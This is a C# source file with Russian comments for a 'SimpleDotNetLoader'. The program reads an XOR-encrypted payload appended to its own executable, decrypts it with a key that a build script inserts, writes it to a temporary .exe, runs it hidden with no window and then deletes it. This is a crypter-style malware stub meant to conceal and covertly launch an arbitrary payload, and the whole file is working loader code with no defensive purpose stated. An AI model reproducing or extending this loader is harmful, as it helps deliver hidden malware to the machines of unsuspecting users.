using System;
using System.IO;
using System.Reflection;
using System.Diagnostics;

namespace SimpleDotNetLoader
{
    class Program
    {
        // XOR дешифровка
        static byte[] XorDecrypt(byte[] data, byte[] key)
        {
            byte[] result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
                result[i] = (byte)(data[i] ^ key[i % key.Length]);
            return result;
        }

        static void Main()
        {
            // === СЮДА ПОДСТАВЛЯЕТСЯ ПИТОНОМ ===
            byte[] ENCRYPTION_KEY = /*KEY_PLACEHOLDER*/;
            int PAYLOAD_SIZE = /*PAYLOAD_SIZE_PLACEHOLDER*/;

            try
            {
                // Получаем путь к текущему exe
                string exePath = Assembly.GetExecutingAssembly().Location;
                
                // Проверяем размер файла
                FileInfo fileInfo = new FileInfo(exePath);
                
                if (fileInfo.Length < PAYLOAD_SIZE)
                {
                    Console.WriteLine("ERROR: File too small!");
                    return;
                }
                
                // Читаем payload из конца файла
                byte[] encryptedPayload = new byte[PAYLOAD_SIZE];
                using (FileStream fs = new FileStream(exePath, FileMode.Open, FileAccess.Read))
                {
                    fs.Seek(-PAYLOAD_SIZE, SeekOrigin.End);
                    fs.Read(encryptedPayload, 0, PAYLOAD_SIZE);
                }
                
                // Дешифруем payload
                byte[] decryptedPayload = XorDecrypt(encryptedPayload, ENCRYPTION_KEY);
                
                // Создаем временный файл
                string tempPath = Path.GetTempFileName() + ".exe";
                File.WriteAllBytes(tempPath, decryptedPayload);
                
                // Запускаем временный файл
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    FileName = tempPath,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                
                Process process = Process.Start(startInfo);
                if (process != null)
                {
                    process.WaitForExit();
                    
                    // Удаляем временный файл
                    try
                    {
                        File.Delete(tempPath);
                    }
                    catch { }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }
    }
} 